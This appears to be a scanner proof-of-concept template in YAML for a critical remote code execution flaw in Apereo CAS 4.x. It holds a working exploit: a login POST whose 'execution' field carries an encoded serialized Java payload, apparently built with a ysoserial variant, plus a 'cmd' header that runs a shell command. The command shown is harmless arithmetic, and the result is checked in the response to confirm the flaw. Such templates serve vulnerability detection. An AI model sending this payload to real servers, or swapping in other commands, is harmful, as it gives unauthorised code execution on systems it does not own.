name: poc-yaml-apereo-cas-v4-rce
binding: 971e1924-0732-4da7-84b9-12422c7f2df8
manual: true
detail:
    author: junfei.song
    links:
        - https://github.com/MrMeizhi/ysoserial-mangguogan
    vulnerability:
        id: CT-529740
        level: critical
transport: http
set:
    r1: randomInt(800000000, 1000000000)
    r2: randomInt(800000000, 1000000000)
    inputPath: request.url.path
rules:
    r0:
        request:
            cache: true
            method: POST
            path: ^{{inputPath}}
            headers:
                Content-Type: application/x-www-form-urlencoded
                cmd: expr {{r1}} + {{r2}}
            body: username=admin&password=admin&lt=LT-3-oEOuExQa7G1Yg4tbDbtcXFZ2aKlz4j-cas01.example.org&execution=55f16605-4581-4162-83af-dc46ffdc73af_AAAAIgAAABC6j80aqzSqzWW%2F4eaLapyvAAAABmFlczEyOLOjtma8RKZeTrrGCL27%2B7kx2XDZQDU9g4JmFc3luVdC7yd9JILiQYJ7LUXXg1VeKaG6u44CUVzMh%2Br4Df46wcdfJA3repd1uRHqS6fBZqepvqbFV%2FcgiBBYPsUGTo0KmHcJZP5cSe2MbiSKsiARn0fSOrsHM1BPew5jWZxXks%2F3frUDlGp%2FDtzRIavRrtk%2FPkMG1ziv71J%2FgTgC5uxNbhzOJ6%2Bnd1xtXTPwiVXX4UjMXfaKMm1eWRJ%2FqCrtRCbOhbOS1SD7Fa7wze36zmwe2%2BhP%2FKA%2FKnoP732ZBH8yYd87Qm2lUwXWRo32gkqqLKUJoD6O7BIV6TWA3VEnBNMoqo%2B%2FBWREvqehqY%2BAxTDVFdCTzHb4yiYEYAURPpnX4wfF93GdtESaPPC6Li0YNvbqHFngOcrjSq0KceeXvFtKaqG4yDS7HgOPzLzdz%2FWL48hDGTWq4Ygs8Uc4dE2H0FjUlEUCSPBU4qWX6GQnuTGhEA%2F4Va0mubKZOh1JC35nlQkBAKPPwv3X3gnLdHleBeww7OlLXiZT5loYbNZhQE%2Bmeex5mt959blYa6iE74wbc36mPTBjTU7NvY%2BCAe3K11rGiKcHMXTp%2B%2Blca9sipcthWvswgSRMKJrWzhpGOzz879JmYT6%2FMOSpEX2McU%2FcD9cCwx3fvlGutTkFr3jLPDNxXQeTBpHYQFfdgK0%2FBR7066nBuSiDEvA8RgqDq3jtvH5Aq9SntJrPPN5pwsesp47Z2KVVtPXca%2FitfUnqPamsbQRTm0WCYyoDN4amlRWuv2f%2Fp5%2FYrYNCpVZ0CpI985arqs7OWhZ5KsXj%2B6gG8KdDi8CQ0UcocRMgl0EHexZzM4BHo3h8NlH9%2Bil8kSu%2Fr2Tg9aZh2%2F5jTgrKIM6Y43Ah2RLNUn4tIirsz4RquT3L4%2Bg5aU4TDAo3hvzOnORgDosGWS1ZNNCgwxupEHAWzXCpSpITMmNblK4U%2F%2BuLJt%2FmsyrbaAiOunmEpBl%2BbK7x%2B8jpj2yH91kdCIeNEWMSlDbhvZHSQFhVU5wy20Vt9HX2i%2FbcxlbBoJES2WvPAzCLMiB%2F5q1rEWWM7prOdRPmG27Z%2FZuz5oT%2BtSHmJ1qGD0%2F07ptYCST10Jfc5iCilukqy9r3UKwtlPg%2Botf0%2BUjNgEJv%2BlgxBuKjfnPjuO351uI1iiB7pN%2FYcHYhydSxYIFUOnzM0zDmV%2FtlhlYEhImOSra3GqQ8BSz3ismkDHwdr55TupBvYcN5KazgyrWaq1d%2B6DRJLDuvyXDkmHqeABCH9xHgfdjvHN1Ejs5Y4R4IddkmsReqRQGd2U1IWUEr5XlRoJxOKKrt57T0hPVO9Jkg8%2FWeZ3qOotxrT8oIlvkWxFyO4AauWi4pwiJxjt0x1UVBI58Ncvl71IY2xMgwsXbfTPAdifwLbXoLmuWecvBtuBTUvmrVY%2FYs4DIbTrSR1VCM5FvponLRAG8oM44z2%2BMO6ZUcXXtbmBdS%2FPRxgU%2Fs1Dg%2F%2Fxxos19WjnKrNsrQCyygbeeeFBm29Ko5W3usXaLhS0avWwPddvuWNGFFjdbcz7n4SGT0G8L3YKlNU3eFT%2FSoBz0FRPDZO11L0BvgYa1H4cQYZHC%2F30Gh8S7bh02aqUc1%2BIqYyYGDAz6VziaNTuq794aS8ZJ0QgJAaDfVoJ4ATlg4NhQaSf21L02iAnuUCqTVydLPuAaeMY5xmu%2FzJv%2FTBU49vJs4RG3GyFkj40phfJ8Vz1gqJpLZ7eirDUltLPv8PXUhItTp0kJAMIAjVW5LwguQ6dWxBSFgrJcl6b4%2FnNboPoyvxAhsNuiaYWIj%2F16l2XFTaQ3hzhgTqsvk7BFtV4onLvrfoAXCtzyn0WS8brrPIrhcRxwtuR8LF8%2BHdjG5xXs5rVNOJhREf%2F0cWun635EdmpZGDkORzNJRb%2F1h0A%2F7KEj7L7zhgb3muEwdOpX%2Bw1YX9VXt1ygjbGXB784yUjaTk3Oh2bfMT740BHoZTFrfNfojsIQLJRUJEcz5hPprqfsYcAwcgvg72FvCXmzYXc1D14TXzVTGDP214rMreEYYhz2yHoWasWN8NQP7lbdXE5ofLTjyhULq7o3JHqIlOAIHfyExEl9AFyeczH9CxjFO3nkzvH8A2zanOirt2NA5GfSDvm%2Bjs%2FdxtA7AsdcG31XNzeqHOFJscmnDTThO4jMKvD7%2BYFI5dFtfadqw1x90e4oQLfyQwA9akhcnDbcE9OE8%2BCOmfgayQlnrRagEo9cyRNkcor%2BpqmpPmw96hWdfcCljE%2BSogu%2BMzCT81Fbk0XWDNWV7DyvuwzYdu5WBgBIFgRCD5M1uqAmsuc7Zl9tKPViTEgcyeJ3sqDQDNUMIzJMhDlTvCUO8R3R42xOwJtymX0D36Qds9sXAWqgTGp%2B48dQ4PRQnKJTCHSmn5%2ByDTYNtTBTNOj86uktIvCrPtaKJHCgjuHA2giFF2Kn4d%2FENfxT9dydVhQTZNPHS9RLFimN4Qs%2FKiW2WbU1ojj83MO%2BXHPZA4DT5o1jzoQoMoLxUundk%2BGdphslyebhELF63Of8UOZzGfMWFbgXBuodzxV8BW%2BGz8JDQ%2F%2F8fjVQjrxwTNQVoyaipEouokOaVrfUEDosvbmvZWv8rYgnTkv65zon83BoerVaG9XrJY27PWAbrXpukDUnNiDyCtXDM4h%2FPDF10QjETXd106s9rZOSxAo%2Bvd79PMjYlrrqL22zjBVKfjAlIsNQXlLkTI4lMm1HYDuXyvlNOqOmyJXIeFsqHCOITHo16elVIcBnxHaj%2FpuiY2dDPg%2FE%3D&_eventId=submit&submit=LOGIN
            follow_redirects: false
        expression: response.body.bcontains(bytes(string(r1 + r2)))
expression: r0()
